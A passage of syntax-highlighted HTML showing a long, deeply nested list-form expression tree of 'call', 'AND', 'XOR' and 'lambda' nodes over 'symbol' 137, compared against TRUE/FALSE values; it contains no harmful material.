class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, <span class="hljs-symbol">&#x27;TRUE</span>&#x27;], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span 